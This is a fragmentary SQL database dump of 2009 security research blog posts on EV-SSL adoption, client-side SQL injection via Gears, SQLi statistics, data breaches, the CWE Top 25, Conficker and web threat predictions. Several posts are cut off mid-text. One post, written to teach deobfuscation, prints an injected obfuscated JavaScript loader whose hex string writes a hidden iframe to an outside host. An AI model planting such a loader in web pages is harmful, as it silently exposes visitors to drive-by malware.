It\'s not intentional; I just have encountered a lot of questionable marketing fluff lately and wanted to talk about it. Today is no different. Tim Callan\'s recent blog post got me thinking. Basically he referenced some SSL attacks that were disclosed at BlackHat, and suggested EV-SSL certificates as the cure to SSL MitM attacks and phishing in general. On the one hand, I believe his conclusion is conveniently aligned with his employer\'s sales agenda. On the other hand, I acknowledge that EV-SSL could raise the bar...if it\'s adopted and deployed in widespread fashion. And therein is the crux.    I\'ve previously talked about the EV-SSL adoption rate (or lack thereof) in this blog. NetCraft has reported its findings of one million valid SSL-capable sites are in use (note: sites with invalid, self-signed, or expired SSL certs are not included in that count). And while I don\'t have access to their commercial SSL Survey report for January 2009, we infer from some third party mentions that the report states around 10,000 EV-SSL sites were found. That\'s 3,000 more than Verisign mentioned last month, but perhaps Verisign was only reporting what they alone issued. Given their marketshare (~75%, albeit that number is a year old) against total EV-SSL cert vendors, that seems to make sense.    Only 10,000 EV-SSL sites within two years seems very low to me, especially for something which is essentially an enhanced derivative of an already understood and accepted technology. People already know what SSL is and what function SSL certs perform, so that definitely is not the hold up. There just doesn\'t seem to be much of an adoption momentum, and maybe that\'s because the additional value these premium EV-SSL certs provide is questionable in the eyes of site owners.    But maybe I\'m looking at this wrong. Only 10,000 EV-SSL sites seems a bit low, but what if they were 10,000 sites that matter? I suppose that would paint a different picture. If 10,000 big sites that account for a notable portion of the web\'s traffic used EV-SSL, I suppose that actually might not be so bad. So I entertained that theory. I manually surfed to each of the upper 50 of Alexa\'s Global Top 500 Sites list, and recorded who was using EV-SSL vs. normal SSL vs. no SSL. The idea is that these sites represent the most visited sites in all of the world (according to Alexa), and as such, assumingly have a vested interest in assuring their voluminous user population that the users\' accounts and transactions are secure. If most of these sites were using EV-SSL, then that would actually provide notable EV-SSL permeation into overall web traffic.    The process I used was simple: visit each of the Alexa-listed sites (the top 50), surf around to find a \'signin\' or \'signup\' form or other equally-sensitive use of HTTPS, and then watch if the URL address bar in my Internet Explorer 7 browser turned green when SSL was utilized. A green bar meant EV-SSL; no green bar but still having a valid lock icon is standard SSL. I found that only two sites (ebay.com and login.live.com) were using EV-SSL. That\'s it. Just two. All of the other sites were using standard SSL, with the exception of ten sites that don\'t use SSL at all with their login forms (youtube.com, hi5.com, mail.ru, photobucket.com, vkontakte.ru, imageshack.us, friendster.com, skyrock.com, odnoklassniki.ru, and dailymotion.com) and two more that don\'t really receive sensitive info from the user and thus don\'t necessitate SSL (bbc.co.uk and cnn.com).    We might label that a bleak picture. Ten of the fifty top sites (20%) don\'t even use SSL for their logins. Only two use EV-SSL. I was a bit surprised to see the online retail giant, Amazon.com, didn\'t use EV-SSL. If EV-SSL was a sure-thing to lead to better customer confidence and more online retail conversions, I would have figured they would have been all over it. They would not be one to overlook a technological advantage if the ROI helped their bottom line...that is, after all, how they got started. And given that they store credit card data for quick purchasing convenience, there is a certain financial value to compromising someone\'s Amazon account; I’m surprised it hasn\'t been the target of more phishing attacks to date.    Also surprising was Yahoo (login.yahoo.com), AOL (my.screenname.aol.com), and Google (www.google.com) all use standard SSL for their common backend authentication sites. These vendors offer multiple different web services, but tie it all back to a single authentication mechanism, much like a Single Sign-On (SSO) platform. And aren\'t some of these vendors OpenID providers? That means a successful phish of a single account could be leveraged across many sites/services, even outside the realm of just these vendors. On Microsoft\'s live.com site, I found that the login form (from login.live.com, which was presented over HTTP by default but did include a link to switch to HTTPS) did go to an EV-SSL site once submitted, but the signup page (signup.live.com) was handled with a standard SSL cert. Maybe they just want to discourage new signups while assuring existing accounts it\'s safe to login.    But here\'s another thought: maybe these sites have invested in standard SSL certificates before EV-SSL was popular, and just are waiting for their current certs to expire before renewing with EV-SSL variants. That seems plausible, but the results are a bit mixed. Google renewed their current standard SSL cert in May 2008 and signup.live.com was renewed in November 2008. That was fairly recent, and definitely after EV-SSL was well established. Opposite that, AOL\'s my.screenname.aol.com certificate was issued in March 2007 and Yahoo\'s is from January 2006; it\'s arguable they were issued before EV-SSL really caught on. So it\'s hard to say, but the thought might hold true for some cases. Certainly not others.    But again, maybe I\'m still looking at it all wrong. EV-SSL might only make the most sense to certain verticals, like online banking sites. The Alexa list doesn\'t really have any bank sites in their top 50. So I did a spot-check of some big bank site URLs pulled from the top of my head. Of all the ones I tried, only BankOfAmerica\'s login site (which is separate from their normal site) used EV-SSL:                     	www.bankofamerica.com: standard SSL (renewed December 2008)  	sitekey.bankofamerica.com: EV-SSL  	www.wellsfargo.com: standard SSL (renewed June 2008)  	online.wellsfargo.com: standard SSL (renewed July 2008)  	www.chase.com: standard SSL (renewed August 2008)  	chaseonline.chase.com: standard SSL (renewed April 2008)  	online.citibank.com: standard SSL (renewed December 2007)  	www.us.hsbc.com: standard SSL (renewed July 2008)  	myonlineaccounts2.abbeynational.co.uk: standard SSL (renewed February 2009**)        That last one is very interesting. Abbey National Bank has been a notable target of phishing attempts going back a year. And yet, when they renewed their SSL certificate last week (February 12, 2009), they went with a standard certificate instead of EV-SSL. Whether they didn\'t know or didn\'t care that EV-SSL could help assure users against phishing, I don\'t know. But if a bank that\'s been phished for over a year doesn\'t decide to buy into EV-SSL when it has the convenient opportunity...who will? Marketing fluff aside, that is probably the absolute best-case realized application for EV-SSL ever. User accounts have access to monetary instruments. The site has been an active target of phishing attempts for over a year. They needed new SSL certs anyway. Any one of those reasons by itself is (supposed) ground for EV-SSL, and they had all three reasons. Oh well, maybe they\'re reconsider EV-SSL in 2010 when their new cert expires.    Until then,  - Jeff    **Postscript: it seems Abbey National Bank\'s site uses a cluster of SSL web servers that have different SSL certs installed. In some cases, I connect to a server that gives me an SSL cert that was issued on Feb 12 2009. On other occasions, I get connected to a server that gives me an SSL cert that expires on Feb 24 2009 (i.e. next week). So apparently they have currently upgraded the SSL certs on some of their servers, but not all. I just wanted to mention this in case you were poking around yourself and noticed the discrepancy.

Within 24 hours, they had responded to my initial communication and shortly thereafter were sharing proposed protections which were then quickly implemented on production systems. Web application vendors can learn from their example.\r\n\r\nYesterday, at the Blackhat DC security conference, I spoke about the dangers of persistent web browser storage. Part of the talk focused on how emerging web browser storage solutions such as Gears (formerly Google Gears) and the Database Storage functionality included in the emerging HTML 5 specification, could be attacked on sites with existing cross-site scripting (XSS) vulnerabilities. The overall message is that while such technologies have built in controls to protect against attacks such as SQL injection (SQLi), when secure technologies are implemented on insecure sites, protections become meaningless.\r\n\r\nBoth Gears and HTML 5 Database Storage, permit web applications to store content in local relational databases, which reside on the local file system by leveraging the SQLite database format. This provides powerful functionality as web applications can now be taken offline as was recently done with Gmail. At the same time, it adds a new attack vector as persistent data can now potentially be attacked on the desktop, not just the server. Given that we\'re dealing with a relational database, is client-side SQL injection (csSQLi) possible? Unfortunately, the answer is yes and it\'s not simply a theoretical attack, it\'s very practical thanks to the significant prevalence of XSS vulnerabilities.\r\n\r\nBoth Gears and HTML 5 Database Storage leverage client-side JavaScript to create and interact with local databases. Therefore, if an XSS vulnerability is present, it\'s all too easy for an attacker to compromise the confidentiality and integrity of locally stored data by reading from or writing to the local database. Web applications with local databases via HTML 5 are presently rare due to the fact that only WebKit based browsers have implemented the functionality (i.e. Safari). This however seems poised to change with recent announcements that offline Gmail access is being developed for the iPhone and Android based phones via HTML 5 Database storage. Gears enabled applications on the other hand have already started to spring up and csSQLi has therefore become a reality.\r\n\r\nPaymo.biz, a time tracking application was previously vulnerable to csSQLi due to the existence of XSS vulnerabilities on the site. The associated image details how JavaScript could be injected to read from the local database and in this proof of concept simply write the data to an alert box. Step #1 is specific to this situation as the XSS injection point occurs within paragraph tags which need to be closed. Gears is a JavaScript API, so in step #2, the API is included in order to expose necessary functions. In step #3, the local database is opened. In traditional (server side) SQLi the database structure must first be determined either through error messages or other brute force means. With csSQLi this is not a challenge since the database structure is exposed. To determine the names of tables, columns, etc. an attacker simply needs to first access the application himself to establish a local copy of the database on his own machine. Executing the SQL statement is conducted in step #4 and once again csSQLi is far less challenging than a server-side SQLi attack. Thanks to having XSS facilitate the attack, the SQL command can be composed from scratch - no need to inject commands into the middle of an preexisting SQL statement. The results of this particular injection can be seen in the associated screen shot which simply displays default data from a newly configured database.\r\n\r\nWhile Gears has not yet been widely adopted, I expect this to change in the coming months, especially with the exposure that the technology will receive thanks to recent integration with Gmail. As users recognize the power of being able to take web applications offline, developers are sure to investigate adding Gears to their own applications. It\'s important to note that this attack has nothing to do with insecurities within the Gears technology itself. As mentioned, the attack is made possible when Gears is implemented on a site with existing XSS vulnerabilities. Unfortunately, XSS is a vulnerability which is far too prevalent on the web today. As such, it is inevitable that we\'ll see sites vulnerable to csSQLi. I hope that this early example illustrates the risks associated with offline browser storage and the importance of ensuring overall application security before adding this powerful functionality. Don\'t avoid Gears...embrace it...but do so securely.\r\n\r\nA full copy of the slides from my talk entitled A Wolf in Sheep\'s Clothing - The Dangers of Persistent Web Browser Storage is available here.\r\n\r\n- michael', 'Abuse', 'https://www.zscaler.com/blogs/research/practical-example-cssqli-using-google-gears-xss');

A Romanian hacking group decided to embarrass as many as possible by identifying SQL injection (SQLi) flaws in public facing websites and Kaspersky, F-Secure and Bit-Defender (actually a reseller) all fell victim to the attacks. Now SQLi is far from a new issue and it\'s widely accepted that pre-auth SQLi vulnerabilities are critical flaws that require immediate attention. Despite this, we see no shortage of SQLi and it is increasingly becoming a favorite tool for botnet authors, who use such vulnerabilities to inject content into otherwise legitimate web pages in order to redirect browser traffic. I recently commented on the volume of such attacks that we\'re seeing and stepped through a specific example.    I spend most of my time worrying about emerging threats - the risks that we\'ll face in the months and years ahead. However, from a business perspective, greater damage comes from current, widespread attacks and companies rightly so, dedicate the majority of security resources to combating the \'clear and present danger\' which they face. The events of this past week caused to to ponder how we\'re doing as an industry in combating what is now a mature and well understood vulnerability - SQLi.    Unfortunately, web application security statistics are somewhat hard to come by. The best come from Whitehat Security, which generally publishes an overview of what they\'re seeing from scanning client websites. They publish these reports a couple of times a year, so I dug up all of their statistics dating back to November 2006. Sadly, as can be seen is the Whitehat chart, progress appears to be relatively flat. The Whitehat statistics shed light on the likelihood that a particular vulnerability will exist on a given website which they review. We can see that over the past 2+ years, on average, their is a 17 1/3% likelihood of discovering a SQLi vulnerability on any given site. That\'s truly frightening and while it helps to explain why such vulnerabilities are so prevalent, it doesn\'t explain why they aren\'t going away.    I also pulled statistics from a 2007 survey conducted by the Web Application Security Consortium. These statistics provide a consolidated view from eight separate security services vendors. This time around, we see that approximately 1/4 of sites scanned revealed SQLi vulnerabilities - even worse.    The question we need to ask ourselves is why are the statistics not improving? In my opinion, while the security industry is getting better at detecting and patching such issues and businesses are better understanding the risks associated with mature vulnerabilities such as SQLi, the population of new developers and web applications is growing at an even faster pace. Who is a web application developer today? Thanks to point and click tools, just about anyone can be a web application developer - but that doesn\'t mean that they\'re a good developer or one that understands and implements secure coding practices. We\'ve struggled for a long time to educate developers about security and while such initiatives are important, they will never be enough. Education alone will never succeed in dropping the statistics included in this blog because the vast majority of \'developers\' will never receive such training. The majority of developers don\'t have a Computer Science degree and they may not even get paid to develop. As such, vulnerability statistics will only begin to drop once protections are built into the architectures of the \'point and click\' development tools, implementing security by default. Fortunately, we have started to see vendors take such steps. Only when the \'every man\' developer can be protected from attack, without security knowledge will we truly see a drop in vulnerability statistics.    - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/rough-week-security-companies');

While such activity is often very obvious as you can spot an IFRAME right before the closing tag, attackers with a little more skill generally attempt to obfuscate the injected code. Depending upon the level of creativity, JavaScript obfuscation may barely be noticeable as code at all and researchers often shy away from de-obfuscating it. The reality is that JavaScript runs within your browser, so you can always figure out what it\'s doing, it just takes a little extra effort. Now you can generally streamline the process by employing tools such as a JavaScript debugger or by inspecting web traffic, but I\'d like to take the old fashioned approach of understanding the code to illustrate that obfuscation is generally not as challenging as it may first appear.    When reviewing our weblogs recently I came across a perfect example of the aforementioned scenario. The Virginia Jyothi Institute of Management website appears to be a perfectly reputable site...except for an interesting snippet of JavaScript at the bottom of the page.    Obfuscated JavaScript:      function C7D36720260A79BEECF3B8D6D(C78D9ED077610F5E11)  {function E69961B4A47426004A21A064DA3(){return 16;}  return(parseInt(C78D9ED077610F5E11,E69961B4A47426004A21A064DA3()));}  function DB47FCE800845F2179C(D89D6EB726D3262DEA5){function  CF7A2398A7A3B02EEF51A624DC28F2(){return 2;}var B0A173316D010072=\"\";  for(D6BE4D56711AC9FE592=0;D6BE4D56711AC9FE592    Ouch! That\'s ugly. At first glance it looks like a jumble of random numbers with a sprinkling of English. However, upon further inspection you can clearly see JavaScript functions (e.g. String.fromCharCode()) and basic syntax, such as a for loop. In reality, it\'s not really ugly at all, but like a freshman dorm room, it does need a little cleanup. Let\'s do three things:    1.) Replace function/variable names - You\'ll notice that the seemingly random numbers are strings that show up more than once. That\'s because they\'re not random at all, they\'re just function and variable names that aren\'t particularly easy on the eyes. Start by replacing these painful names with simple letters.    2.) Add white space - obfuscation generally involves removing white space and cramming everything together, so add it back. Follow they JavaScript syntax but expand it to a common format that you\'re comfortable with.    3.) Rearrange - So long as you don\'t change the logic flow, move things around, once again, to an arrangement that is more comfortable.    Once we make these changes, we have much more manageable code. As they say, let\'s put some lipstick on that pig...    The same function cleaned up:      D(\"3C696672616D65207372633D22687474703A2F2F6D6F6E6579  323030382E6F72672F746D702F222077696474683D31206865696  768743D31207374796C653D227669736962696C6974793A686964  64656E3B706F736974696F6E3A6162736F6C757465223E3C2F696  672616D653E\");    function A(B)  {    function C()    {      return 16;    }    return(parseInt(B,C()));  }    function D(F)  {    function G()    {      return 2;    }    var H=\"\";    for(E=0;E    {      H+=(String.fromCharCode(A(F.substr(E,G()))));    }    document.write(H);  }    Wow, what a huge improvement. Now that\'s something that I can deal with. It still may seem a bit verbose for what it\'s trying to accomplish, but let\'s walk through it one step at a time.      	We start of by sending a large string of data to D().  	Within D(), let\'s look at the for loop. It\'s iterating over the data two characters at a time (G() returns 2).  	Each pair of characters are sent to A() where they are converted from base 16, which tells us that they\'re hexadecimal values.  	Once converted, the integers are then fed to String.fromCharCode(), which is essentially an automated ASCII table, converting decimal values to letters.  	The entire string is iterated over until each hexadecimal pair is converted to a letter.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (599, 'EV-SSL\'s Reported Successes, Maybe', 'ThreatLabz', 'January 23, 2009', 'In a previous post I included a blurb mentioning that Verisign reported 7000 EV-SSL certificates were issued in the past two years, which seems fairly low. Recently I was referred to a spot on Verisign’s website where they keep their SSL case studies. Many of their more recently posted studies indicate the positive benefit/increased conversions brought about by using EV-SSL certificates. In other words, switching from standard SSL to EV-SSL certs lead to more sales, all because of customer confidence in seeing the \'green bar\'.    For some reason, a mental warning alarm was going off in the back of my head. So I decided to dig deeper into the case studies to see how they actually tested things. After all, a flawed test methodology results in questionable results. I\'m a bit of a stickler when it comes to having a solid, repeatable methodology for testing stuff.    In an ideal world, these case studies would have been conducted by subjecting half of their web clients to a standard SSL certificate, and the other half to an EV-SSL certificate. Easier said than done, but I suppose it\'s possible if you had a web server farm where half of the servers had the EV-SSL cert loaded and the other half didn\'t, and you used a network load balancer in front of everything to persistently keep the same client/source IP address connection mapped to the same server in the farm. You couldn\'t use an application level load balancer because that would require terminating the SSL to see the application-layer data, and you wouldn\'t know to terminate with EV-SSL vs. standard SSL. A completely wrong methodology would be see how many sales you got using the standard SSL certificate, then see how many you got after you upgraded to EV-SSL, and attribute the change to just the EV-SSL certificate. There are too many other factors that could affect a change in sales, such as a slow-down in the economy, a wave of released stimulus checks, a newly-launched advertising campaign, etc.    So how did they test? In the few case studies I read, they simply separated traffic into EV-SSL capable browsers (Internet Explorer 7, Firefox 3) vs. non-EV-SSL capable browsers (Internet Explorer 6, Firefox 2). The idea is that the non-EV-SSL browsers were not showing the green bar, while the EV-SSL browsers were. Then they measured the conversion rate of these two groups, and of course, the EV-SSL browser group had higher conversions. So it must have been the green bar. Or was it?    The core problem with this approach is that the population representation is skewed. The methodology assumes that users of IE7 are no different than users of IE6, which is not the case. The web development community is already largely aware that a significant portion of the remaining IE6 hold-outs (i.e. those who have not upgraded to IE7) are actually corporate users that are running on systems that are not allowed to be upgraded. Think about it: a notable number of home users will leverage Window\'s standard automatic update feature, and that would have updated them to IE7 long ago. Corporate environments, on the other hand, control the updates and look to have consistent version deployments across desktops. Further, they have a significant investment in web applications tailored to work with IE6 (which has been out for 7 years now...so that\'s 7 years of web apps that were made just for it); if the choice is to update all internal web apps to work with IE7, or just keep the corporate desktops at IE6, well, the fiscal choice is obvious.    Thus let\'s frame this scenario a bit differently: given visitors to a non-business-centric retail shopping web site, who is more likely to buy something...people shopping from their home computer, or people shopping from their work computer? Would you normally be tempted to buy a new pair of shoes online using your corporate workstation on your lunch break? Would you perhaps search a little to figure out what you wanted (which seems like an innocent-enough use of the corporate network), and then finish the transaction (i.e. officially make the purchase) later that evening when you got home?    Therefore my biggest complaint about the EV-SSL testing methodology that these case studies use is that the non-EV-SSL browser group (particularly IE6 users) will statistically have more coming-from-their-corporate-workstation users in it, and I\'m not convinced that such users are identical to other users in regards to their immediate willingness to make personal retail or pharmaceutical purchases. Personally, I would expect those corporate users to be less-likely to lead to an immediate retail conversion. And that\'s what the EV-SSL case studies all seem to say/support...but they attribute that phenomenon to the presence or absence of the EV-SSL certificate.    So does that mean EV-SSL is responsible for the higher conversion rate? Not necessarily. Does it mean it\'s not responsible? Well, not necessarily. To know for sure, all other variables must be approximately equal...and in these situations, there are too many differing factors between the two groups to know in particular which factor is having the most impact. To help put things in perspective, it would be nice to see the same metrics (i.e. conversion rates for IE7 vs IE6 users) reported for sizable retail sites that are not using EV-SSL certificates. I have a hunch that, even without EV-SSL, those sites will still see slightly higher conversion rates for IE7 users compared to IE6 users.

This makes the 2007 TJ Maxx breach of 45 million debit and credit cards look fairly reasonable. To make matters worse for Heartland, their PR department apparently felt they they could sweep the item under the rug with some shameless tactics such as announcing the breach on inauguration day and registering the domain name 2008breach.com to discuss the matter. The latter appears to be an effort to distance the information from the Heartland corporate name and make it appear to be a dated issue.    What frightens me about such issues is not the earth shattering numbers that make the headlines for a single breach but the fact that for every Heartland, there are hundreds if not thousands of data breaches that go relatively unnoticed. In a past role, I was involved in a customer round table to discuss security, which attracted CISOs from a variety of large companies. During a discussion on data loss, talk turned to unintentional loses such as \'losing a tape off the back of the truck\'. A CISO from a major financial institution shook his head and said \"if only you knew how common that is\". I have no doubt that he was being frighteningly honest with that statement and in a world where access to a few simple details such as my SSN could ruin me financially, that is truly a sobering thought.    The Open Security Foundation does an excellent job of trying to ensure that data breaches don\'t go unnoticed, by maintaining the Data Loss DB. It is a well maintained, detailed, open source collection of data and statistics regarding data loss dating back to 2000. When Heartland came forward, I decided to look back at the past year to see just how severe a problem this has become.      	The Data Loss DB contains records for 479 incidents of data loss during 2008  	Records exist to suggest that at least 83,350,024 accounts were affected in 2008, however, estimates of the numbers of accounts affected were not available for 26% of incidents, so the actual number is higher  	Stolen laptops accounted for the majority of the data loss at 20% of all incidents, while hacks of some description accounted for 17% of incidents and web specific hacks were responsible for 14% of the results  	Social Security Numbers were lost in one third of all attacks last year      Besides being thoroughly depressing, these statistics should teach us a few things. First and foremost, while the Heartlands of the world will capture the headlines, they represent only the tip of the iceberg in terms of the loses that occur every day. Moreover, data loss occurs in a multitude of ways, both through direct attacks and carelessness on the part of employees. The important thing is that companies have both preventive and detective controls in place to ensure that such incidents are stopped in the first place but also identified when they do occur.

The errors were selected from the Common Weakness Enumeration (CWE) collection, which looks to enumerate all the different ways a piece of software can create a security vulnerability. For those familiar with CVE (Common Vulnerabilities and Exposures), the difference between CVE and CWE is the former tracks point instances of vulnerabilities in specific applications, while the latter tracks the different ways a vulnerability can manifest in any arbitrary application.\r\n\r\nThe list does cover the gamut of heavy-hitting vulnerability types that traditionally plague applications (SQL injection, XSS, command injection, buffer overflows, file name manipulation, sending data in the clear or with weak crypto, etc.), but nothing on it is particularly earth-shattering. I always chuckle to myself when I see entries like CWE-20 (Improper input validation) and CWE-116 (Improper output validation) as they are a bit of a catch-all and, from some viewpoints, subsume all of the more specific input/output validation errors such as SQL injection, XSS, etc. A programming shop that validated all of their incoming data would likely be able to cross multiple items off the list...but it\'s actually a fairly tall task. I\'ve dealt with many application audits and security code reviews in my past, and I\'ve never encountered a programming shop who felt it was realistic to go back and audit/adjust all inputs for validation on a moderate sized app (or larger). These large applications—many being web-based—sourced data from too many places to feasibly and accurately account for them all. Which goes along with something me and many other security professionals have always said: it is easier to design security in, rather than retrofit it after-the-fact. Having and mandating the use of a core set of available global validation functions will (hopefully) keep programmers tagging inputs with a base level of validation as the application grows and sprawls. Once a large application is written, trying to find and evaluate all inputs is like trying to find needles in a haystack. In my experience, most organizations change tactics at that point and look to just ensure they are not vulnerable to specific errors. In other words, rather than ensure all inputs are validated, they will instead just review the areas around their SQL calls to ensure there are no SQL injection issues. This essentially employs validation at \'time of use\' rather than \'time of reception.\' On the surface this seems like a good strategy--after all, there are likely few times of use for any given input that could result in a security vulnerability. But the long-term problem with his approach is that it creates a patchwork effect where validation is not done consistently. If input validation is done at point A (immediately up receiving), then all subsequent uses of that data (i.e. points B, C, and D) are in the clear. But if you instead employ validation at point D (i.e. time of use), then you\'re OK for now...until a programmer decides to branch C to call point E. At that point, E will inherit dirty data, but the programmer might not suspect it because they were mentally complacent with the idea that the data was previously clean at point D. Any direct or derived uses of the data at points A, B, C will still be susceptible to vulnerability.\r\n\r\nBut input validation aside, let\'s look at the list as a whole. It\'s meant for application developers, and addresses programming issues. These are definitely worth fixing, but at the same time, they can only go so far; in particular, this list does not address operational security issues. Here are some examples of security incidents that the list would not address:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	High-profile Twitter accounts were compromised due to an admin Twitter account having an easily-guessed password\r\n	 \r\n	In-session phishing has malicious sites showing fake session expiration popups to users, encouraging them to supply login credentials to re-login\r\n	 \r\n	30 million AOL account records were sold to spammers by an internal AOL employee\r\n	 \r\n	Spammers are still regularly abusing any open SMTP relay found on the Internet; open HTTP proxies are no better off\r\n	 \r\n	Laptops (and backup tapes) containing confidential records are being stolen at what now seems like regular intervals; the largest to date was US Veteran Affairs, having 26.5 million records compromised\r\n	 \r\n	Part of the CardSystems fiasco involved having unencrypted copies of consumer data laying around for \'test/research purposes\'\r\n	 \r\n	Consumer gadgets are now shipping with viruses/malware (Samsung digital photo frames, ASUS Eee Box PC, TomTom navigator, etc.)\r\n\r\n\r\nOverall the CWE/SANS list effort is good, because everyone could definitely benefit from a higher level of security in application software. But a look at the recent high-profile security incidents shows that humans are still a very real and very weak link in the security chain. So it\'s important to keep the list in perspective; even if you tackle all 25 items on the list, you may still be exposed by weak operational practices, user oversights, or what would have been item 26 on the list. It is worth noting that SANS also has a broader Top 20 Security Risks list, which does encompass a lot of operational security issues.\r\nUpdate: also check out the How to suck at Information Security list, also posted at SANS.\r\n\r\n- Jeff', 'Vulnerability', 'https://www.zscaler.com/blogs/research/sanscwe-top-25-programming-errors');

This past week however a new variant of Conficker (aka Downadup) reportedly infected millions of Windows machines. So called \'big bang\' worms have largely faded from the headlines not so much for technical reasons but rather for both procedural and motivational reasons. On the procedural front, we\'ve shortened patch cycles and locked down external access to/from networks. From a motivational standpoint, attackers have decided that \'big bang\' worms don\'t meet their needs. Attackers have real financial motivations and drawing media attention to their efforts is not generally conducive to increasing revenue. Attacks have tended to be increasingly stealthy in nature. Why then has Conficker suddenly been so successful? Not surprisingly, the answer relates to weaknesses in enterprise defenses and ingenuity on the part of the attackers.    Enterprise Defenses    Patch Management - It would appear that patch cycles aren\'t so foolproof after all or at least there are still adequate numbers of end users that are not patching machines in a timely fashion. Conficker uses a vulnerability (MS08-067) that was patched nearly three months ago as its primary attack vector. Now a significant potion of unpatched machines may represent home as opposed to enterprise users but if you\'re looking for willing zombies with broadband connections, there\'s no need to be picky. Some are using the success of Conficker to call for mandatory patching.    Network Shares - Should vulnerability exploitation not succeed, Conficker then looks for network shares with weak passwords. While enterprises have significantly locked down the network perimeter over the years, the LAN itself is typically wide open. End users are freely permitted to open network shares and password strength is not enforced. Companies need to realize that it takes only one infected machine to infect an entire network. When the majority of computers are laptops that leave the corporate fortress regularly, having a single infected machine is almost a given.    Attack Techniques    Multi-faceted - Conficker is a hard working worm. It attempts to exploit machines vulnerable to MS08-067, spread via network shares and even connected removable storage devices. While leveraging multiple attack vectors is not a new technique for malware writers, Conficker\'s authors were wise to choose paths covering a lot of ground. Rather than just hammering away at a list of known vulnerabilities which are likely all exposed or all patched, Conficker instead tries exploitation, brute force and piggybacking.    Dynamic Domain Names - Once infected, Conficker attempts to contact other attacker controlled machines in order to retrieve additional code. Rather than simply using a round robin of hard coded domain names or IP addresses, Conficker instead has the ability to contact thousands of potential domain names. Those controlling Conficker can use only specific names and ignore others. Taking down all of the domain names would be time consuming and in most cases a waste of time as they may never be used.    Is Conficker an anomaly or a sign of things to come. While I don\'t expect to see a resurgence of \'big bang\' worms, I do expect malcode authors to learn from the successes of Conficker.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (603, '2009 Web Security Predictions', 'Michael Sutton', 'January 06, 2009', '2009 is a year when some fundamental shifts in web technology will begin to take hold and attackers will adjust accordingly. With the emergence of revolutionary changes such as cloud computing, widespread adoption of next generation web application technologies and the ‘real’ web arriving on mobile devices, we must anticipate that attackers will adjust their tactics to leverage these shifts. From a corporate perspective, anticipating attack and business trends can make the difference between being prepared for an emerging threat or being blind-sided by a new attack. We have combined the wealth of knowledge shared among Zscaler researchers with our unique access to web traffic to assemble our top 10 web security predictions for the coming year.    1.) Cloud Computing Is Ready For Primetime    2008 was the year in which \'cloud computing\' truly emerged on the public stage and gained acceptance as a force to be reckoned with. In the coming year the honeymoon period is over and it\'s time for cloud computing to prove it\'s worth. Now we’re obviously biased but I fully expect 2009 to be a critical year for security in the cloud. We\'ve moved past peaked curiosity to detailed evaluations and bake-offs of the many competing solutions that are beginning to emerge. This is the year where the pretenders will quickly be relegated to the sidelines and by year-end dominant players will begin to emerge.    For this process to occur, companies are going to need to define criteria for assessing security in the cloud. It will require a different approach than traditional software assessments, as you don\'t get to hold and touch SaaS solutions. This in turn makes it even more important that evaluators hold SaaS vendor\'s feet to the fire. Just because a vendor says that a feature exists - ensure that you understand how and determine if it will meet your needs.    2.) The ‘Mobile Web’ Is No Longer A Separate Platform    Check historical security predictions and you\'ll see that every year for the past decade was labeled as the moment when mobile malware would explode. It made sense. After all more and more people were leveraging mobile devices so attackers needed to adjust their focus eventually...yet they didn\'t. The number of large-scale attacks on mobile devices has been minimal. How can this be and will 2009 be any different?    Mobile malware has largely remained on the sidelines for two reasons. First, the multitude of platforms has limited the payback from putting in the work to exploit vulnerabilities in a single implementation. Secondly, mobile applications have largely lacked the feature set of their desktop counterparts, which leads to limited use.    Thanks in part to the competitive innovation injected by Apple\'s iPhone, the ‘mobile web’ is no longer a separate platform. What do we mean by that? There is no longer a clear distinction between web content for mobile and traditional browsers. You don\'t need WAP, WML, etc. to access the web on your phone. Standard web applications are now realistically accessible despite the limited screen real estate on a mobile device.    What does this mean for mobile attacks? It means that 2009 will be a significant year, but not because attacks will suddenly shift to mobile platforms. Mobile attacks will finally become a mainstream problem because mobile devices are susceptible to traditional attacks. Browsers such as Mobile Safari, Internet Explorer Mobile, Mobile Opera, etc. now have full JavaScript engines and can generally accommodate Rich Internet Applications. This combined with the fact that they now drive a meaningful volume of Internet traffic means that they are susceptible to many of the non-browser specific attacks such as Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Clickjacking, etc. They also tend to share libraries with their oft-vulnerable desktop siblings, so also expect browser specific vulnerabilities to be on the rise.    3.) Is Client Side Browser Storage a Feature or a Ticking Time Bomb?    The line between web and native desktop applications is continuing to blur. Rich Internet Application technologies such as Flash and SilverLight and the emergence of development approaches such as AJAX have made web applications much more interactive and user friendly. However, despite these advancements, a critical differentiator between desktop and web applications remains the need for connectivity. Sure, Google Docs is a great alternative to Microsoft Office - until you board a plane. You can\'t use web applications unless you have access to them.    This too is starting to change as browsers are gaining access to client side storage solutions. Flash storage, Google Gears and Structured Client Side Storage, detailed in the HTML 5 specification all address this issue. While this opens up new doors for web applications, as with any new technology, if it is implemented insecurely, it can increase risk and create new headaches for corporate security staff. Our early review of these technologies suggests that they are not well understood and are indeed being poorly implemented. This is turn will lead to the leakage of sensitive information and client side equivalents of XSS and SQL injection. Stay tuned for further posts on this topic.    4.) Web API Vulnerabilities Lead to Mass Attacks    Code reuse has always been encouraged - why reinvent the wheel. It\'s also a good security practice as open, stable code has been scrutinized by many eyeballs and is therefore more likely to be secure. In web development however, that is not always the case. While we may leverage functionality created by others, the security of that code may not have been assessed by anyone other than the original creators. That occurs because we\'re not necessarily dealing with open source code or even compiled binaries but rather web based APIs. In this case, we\'re largely counting on the providers of a given service to ensure that it\'s secure. Google for example makes available a plethora of APIs for everything from maps to social networks and despite investing in securing code prior to release; they have seen their fair share of vulnerabilities. When a vulnerability is discovered in such an API, hundreds and thousands of sites can instantly be affected. Fortunately, patching can generally be completed quickly as only servers hosting the API need to be updated but this can also break associated applications. From an attacker\'s perspective, a web API vulnerability can signal a target rich environment with a small window of opportunity - a good reason to keep quiet once a vulnerability is discovered.    5.) Abusing the Architecture Of The Web As Opposed To Vulnerabilities In Specific Applications    Traditionally, vulnerabilities have exploited a specific error on a specific platform. The web however, has opened the door for attacks which are cross-platform simply because they abuse intended functionality. Let\'s face it - the web was designed to be open - not secure. Moreover, the interconnected nature of the web means that a vulnerability on one node (i.e. a web server) can indirectly lead to a compromise on another node (i.e. a web browser). We could argue that these facts of life on the web account for the majority of security incidents today and that the trend will only continue to escalate. XSS is an entrenched example of this fact. The web was designed to freely share content between 